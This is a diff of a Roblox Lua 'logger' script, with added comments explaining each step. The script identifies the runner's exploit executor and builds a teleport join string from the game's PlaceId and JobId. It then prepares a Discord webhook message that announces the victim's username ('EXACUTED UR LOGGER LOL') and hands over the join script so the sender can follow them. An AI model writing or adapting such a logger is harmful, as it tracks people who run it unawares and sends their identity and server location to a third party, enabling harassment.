@@ -1,17 +1,21 @@
+
+--creates the join script
 local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
 print(helo)
- 
+
+--checks what exacutor ur using
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"
- 
+
+--webhook here ofc
 local url =
    "Your webhook here"
 local data = {
-   ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** EXACUTED UR LOGGER LOL",
+   ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** EXACUTED UR LOGGER LOL", --text outside of the box
    ["embeds"] = {
        {
            ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just got logged!!!**",
@@ -19,7 +23,7 @@ local data = {
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["footer"] = {
-             ["text"] = "" ..join_script.. ""
+             ["text"] = "" ..join_script.. "" --posts the join script created by the first function
            }
        }
    }
